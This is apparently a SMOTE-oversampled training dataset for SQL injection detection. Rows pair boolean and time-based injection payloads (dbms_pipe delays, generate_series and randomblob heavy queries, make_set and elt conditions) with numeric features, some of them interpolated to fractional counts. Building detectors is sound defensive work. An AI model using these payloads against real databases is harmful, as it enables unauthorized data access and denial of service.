id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001793,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,0.16827741501010646,112.33938681216458,32.0,3.8657052036822535,37.76799059205724,20.732122637567088,40.785698110053666,13.053575472486582,0.3341301689507438,0.18535628575215227,0.36415591089806637,0.11635763439903757,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.892849055026835,0.0,0.9464245275134171,1.053575472486583,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001794,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,2.5143312491565877,135.65736374621352,32.0,3.5098332811765376,35.0,19.228424169190983,61.65736374621352,19.771575830809017,0.2585044566025204,0.14331396402123062,0.4534477203260997,0.14473385905014927,2.0,1.8857879154045083,0.0,1.0,0.0,2.0,0.0,10.942893957702253,0.9428939577022539,0.0,1.0,3.0,1.0,0.471446978851127,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001795,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,0.35999960708966133,150.68719488412881,32.1564025579356,3.807754092522075,46.5307923261932,16.6256102317424,59.6871948841288,27.8435974420644,0.30872872377803845,0.11044159241550845,0.39606860091254315,0.1847610828939099,3.765396163096601,0.0,0.15640255793559954,0.0,0.0,2.0,0.0,11.9217987210322,0.0,2.0,1.0,8.1564025579356,1.0,0.0,0.07820127896779971,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.07820127896779971,0.0,0.9217987210322003,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001796,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000056,0.22813528785449455,89.60424786570944,26.838951676812627,3.648416204234711,30.624220579229465,12.516855030437885,34.57053780483368,11.89263445120842,0.3421931342135061,0.13849173043374888,0.3862671622891013,0.13304797306364374,0.0,0.0,2.0,0.0,1.0,1.0536827743957908,0.0,5.7852689024168376,0.0,0.9463172256042094,0.9463172256042094,4.107365548791581,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.05368277439579061,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0536827743957904
SMOTE_001797,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000008,0.7051420822920853,163.06398244139655,37.645339186201156,4.027792907790884,51.82266959310058,23.177330406899422,58.06398244139653,30.0,0.3178992279221661,0.1421316846621688,0.3559567223819311,0.18401236503373397,3.177330406899423,0.0,1.6453391862011535,0.0,0.0,2.0,0.0,11.177330406899422,0.0,2.0,1.0,11.645339186201154,1.0,0.0,0.8226695931005767,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.8226695931005767,0.1773304068994232,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001798,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000036,1.120302829709499,130.5314371254685,30.84081836320679,4.072481330790666,72.9820359283037,5.840818363206788,33.531437125468514,18.177145708489505,0.5628251105812105,0.04411187202063842,0.25444506284158575,0.13861795455656536,3.0,0.0,0.0,0.0,0.8318363273586422,0.0,0.0,5.177145708489504,0.0,4.495508982075926,3.4955089820759273,1.8408183632067883,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.16816367264135773,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001799,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000063,1.010333443991524,66.40369700584105,24.5341548901869,3.6885128658849426,11.801232335280353,21.801232335280353,24.0,8.801232335280352,0.1771913960602934,0.32829649664710625,0.36265224140835073,0.13185986588424958,0.0,0.2670774450934503,2.2670774450934505,0.0,0.0,2.0,0.0,3.0,0.0,0.2670774450934503,1.0,4.2670774450934505,0.0,0.2670774450934504,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7329225549065497,0.2670774450934503,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001800,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,1.4662922584646014,102.78571948747287,28.8609030769694,3.5569981546161054,31.620301025656467,13.0,43.684214359190534,14.481204102625867,0.30979920971259534,0.12755101365263263,0.42235397848399486,0.14029579815077717,0.6203010256564669,0.0,2.0,0.0,1.0,1.0,0.0,7.8609030769694,0.0,1.0,1.0,4.0,0.6203010256564669,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.6203010256564669,0.3796989743435331,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001801,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,0.566552457591404,81.91043118607575,24.15318058874083,3.243607117858473,17.612722354963317,12.15318058874083,39.5318058874083,12.612722354963317,0.21505137378956526,0.14895067066360326,0.4823580831870804,0.1536398723597511,0.0,4.0,0.8468194112591705,0.0,0.0,1.1531805887408295,0.0,6.3063611774816595,0.0,0.15318058874082952,0.15318058874082974,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1531805887408295,0.8468194112591705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001802,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000015,3.4357973939135915,142.21836102828425,31.353710862350717,4.246030803204094,83.23144568824642,7.23144568824642,36.109180514142125,15.646289137649283,0.5872998003037918,0.049830812707416905,0.25248138729114317,0.11038799969764816,0.6462891376492838,1.0611325870521484,0.0,0.0,1.0,1.0,0.0,4.292578275298568,0.0,0.0,3.0,2.0,0.6462891376492839,0.35371086235071614,0.0,0.646289137649284,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001803,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,2.352490608611778,139.52539665873036,32.0,3.7891188180479713,42.41015866349214,15.541015866349214,55.41015866349214,26.164063465396858,0.30317672212903324,0.11196715280558422,0.3971097528993741,0.18774637216600837,2.1640634653968576,0.0,0.9179682673015712,0.0,0.0,1.5410158663492144,0.0,11.541015866349214,0.0,2.0,1.0,8.458984133650786,0.5410158663492144,0.0,0.4589841336507856,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5410158663492144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5410158663492142
SMOTE_001804,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000066,0.017306295376696947,142.0690982421122,34.01381964842244,3.910797117737536,41.03800403316171,23.99654508789439,52.01727456052805,25.01727456052805,0.2888438334542846,0.16892066791298516,0.3661476212400082,0.17608787739272205,0.01036473631683088,0.9965450878943897,2.0,0.0,0.0,2.0,0.0,10.00345491210561,0.0,2.0,1.0,10.00690982421122,0.0034549121056103305,0.9965450878943896,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0034549121056104415,0.0,1.0,0.0,0.0034549121056102194,0.9965450878943897,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.00345491210561
SMOTE_001805,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,0.019207951148010678,78.95734740104788,23.95734740104789,3.239899067095811,16.965344763351407,11.968010550785916,38.02132629947606,12.002665787434506,0.21478547930217948,0.15149380444032806,0.48167682869575823,0.15204388756173426,0.0,4.0,0.997334212565493,0.0,0.0,1.0,0.0,6.005331574869014,0.0,0.0,0.0,1.9973342125654932,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.997334212565493,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9973342125654932
SMOTE_001806,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000068,1.2800614212202852,124.65398571796149,29.796577068152825,4.253589076042172,77.67110037719735,5.155892481783393,28.030415790827917,13.796577068152827,0.6287412288806892,0.039019415220029746,0.2219804390391671,0.11025891686011403,3.359315413630565,0.0,0.0,0.0,1.0,1.0,0.0,2.7186308272611304,0.0,0.0,2.3593154136305654,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.3593154136305653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3593154136305654
SMOTE_001807,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,0.22221501877808852,74.22764713407386,23.136588280444325,3.6343704971821498,20.863411719555675,13.364235414518204,28.045529426814777,11.954470573185224,0.28123706422024775,0.17978002188357625,0.3778643615857381,0.16111855231043792,3.908941146370449,0.0,0.0,0.0,0.04552942681477551,2.0,0.0,4.0,0.0,0.9544705731852245,0.9544705731852245,2.136588280444326,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.04552942681477545,0.0,0.04552942681477545,0.0,1.9544705731852248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0455294268147757
SMOTE_001808,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,1.366080632633286,132.05313342102465,32.576488897240445,3.7837069497243694,38.15297779448089,17.594200037581995,51.72946669172133,24.576488897240445,0.2894022927074117,0.1317931218777649,0.3922500881171393,0.18655449729768406,0.2882444486202216,0.0,2.0,0.0,0.0,1.2882444486202218,0.0,11.0,0.0,2.0,1.0,9.288244448620222,0.2882444486202217,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.2882444486202217,0.0,0.7117555513797783,0.2882444486202217,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2882444486202216
SMOTE_001809,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,1.2350962683067224,123.53267819395259,32.0,3.9670592225647225,49.78594601334785,18.9112203010079,41.0,13.83551187959684,0.3932696691904235,0.1575592109985862,0.336538252766465,0.1126328670445253,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.58224406020158,0.0,0.5822440602015801,1.4177559397984199,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001810,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,2.055629228732165,134.6252625934579,32.0,3.5291920267252492,35.0,19.916491604361404,60.62526259345789,19.083508395638596,0.26046131144252294,0.14944544251990527,0.4493103700929515,0.14078287594462033,2.0,1.5417541978192975,0.0,1.0,0.0,2.0,0.0,10.770877098909647,0.7708770989096487,0.0,1.0,3.0,1.0,0.3854385494548244,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001811,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,2.279837760588369,115.90412893742528,28.52396776564368,4.1076769578422025,75.28429010920689,4.047935531287358,22.47603223435632,14.095871062574718,0.649064519617335,0.03508355678558077,0.19390253033699556,0.1219493932600887,3.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0,0.0,2.6198388282183966,3.047935531287359,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001812,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000036,0.14691521398798468,127.12337857211463,29.93831071394268,4.073617286066433,75.27760178725794,4.9383107139426805,30.030844643028658,16.87662142788536,0.5921140851158959,0.03886208858629245,0.23623345029159107,0.1327903760062206,3.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,0.0,4.8457767848567,3.93831071394268,1.0000000000000004,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001813,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000016,0.4196396694115254,72.0038728798831,25.7786384177518,3.798052841254533,13.667957626627704,23.667957626627704,24.0,10.667957626627704,0.18957762979996975,0.32869605257419254,0.3338842146581347,0.14784210296770292,0.0,0.889319208875901,2.889319208875901,0.0,0.0,2.0,0.0,3.0,0.0,0.8893192088759009,1.0,4.889319208875901,0.0,0.8893192088759008,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.11068079112409901,0.8893192088759009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001814,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,1.2293224822789948,148.46156796213157,33.0,4.273326947885458,81.96175971598683,9.0,39.69216018934212,17.807648056802634,0.5518242867615725,0.0606239276966998,0.267545717646583,0.12000606789514477,3.192351943197365,0.0,0.5384320378684235,0.0,1.0,1.0,0.0,4.807648056802635,0.26921601893421165,0.0,3.0,2.5384320378684233,1.0,0.0,0.2692160189342116,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7307839810657883,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7307839810657883
SMOTE_001815,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,1.7724630936405281,153.97048839386252,35.858796905030005,3.925120211553573,46.11169148883252,23.5353007737425,56.4646992262575,27.858796905030005,0.29846429095112187,0.1533718607662487,0.36742938759568117,0.18073446068694823,1.9293984525150034,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.929398452515002,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.46469922625750176,0.0,1.0,0.0,0.46469922625750176,0.5353007737424983,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4646992262575016
SMOTE_001816,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,0.466642947098516,76.00724135151542,23.547429459504208,3.627427772740951,22.003620675757713,13.0,29.003620675757716,12.0,0.2883045976385482,0.17200251441867953,0.3809213361716834,0.15877155177108881,3.726285270247897,0.0,0.0,0.0,0.09123824325070112,1.908761756749299,0.0,4.273714729752103,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.09123824325070118,0.0,0.0,0.09123824325070118,1.908761756749299,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.091238243250701
SMOTE_001817,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000018,0.21018708465902303,62.259934887258204,26.74801302254836,3.899569727091372,12.0,16.0,21.007947909806568,13.251986977451642,0.19323038128674708,0.25764050838232944,0.33624708491180705,0.21288202541911647,0.0,4.0,1.0,0.0,0.0,2.0,0.0,2.251986977451642,2.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001818,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,1.4310978072631049,88.39254616403963,23.078509232807924,3.2111281249036003,15.87602462082113,14.921490767192076,42.876024620821134,14.719006155205282,0.17735516884627966,0.17115847000888965,0.4847563556634582,0.16673000548137246,0.0,4.0,0.6404969223973586,0.0,0.6404969223973587,2.0,0.0,6.719006155205283,0.0,0.35950307760264144,0.35950307760264144,3.2809938447947173,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3595030776026416,0.6404969223973586,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001819,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,0.7697787868479389,151.68187730071494,35.27272031756295,4.269769554536655,72.04555539533726,17.545440635125896,43.954521111470314,18.136360158781475,0.4729923621209405,0.11623878773804311,0.2909126707382541,0.11985617940276225,1.4090804763444211,0.0,1.7272796824370527,0.0,1.0,2.0,0.0,5.409080476344421,0.0,0.13636015878147367,2.727279682437053,5.0,1.0,0.0,0.8636398412185264,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1363601587814736,0.0,1.0,1.0,0.13636015878147356,0.8636398412185262,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.136360158781473
SMOTE_001820,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,1.491792814560519,123.16024011030325,32.0,4.037507184195749,52.051516945600284,18.56795197793935,39.05436158235148,13.48640960441213,0.4133512014434761,0.1543904098592276,0.32203658526222717,0.11022180343506917,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.0271807911757405,0.0,0.5135903955878702,1.4864096044121298,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001821,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,0.5342256459585922,78.45271504185465,25.671629025112793,3.738288278500059,18.32837097488721,20.12434406696745,28.890543008370933,11.109456991629068,0.23397065279895746,0.25595555344021226,0.368324351941074,0.14174944181975627,2.2189139832581377,0.0,0.0,0.0,0.8905430083709311,2.0,0.0,4.0,0.0,0.10945699162906875,0.10945699162906886,4.671629025112794,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8905430083709311,0.0,0.8905430083709311,0.0,1.1094569916290686,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.890543008370931
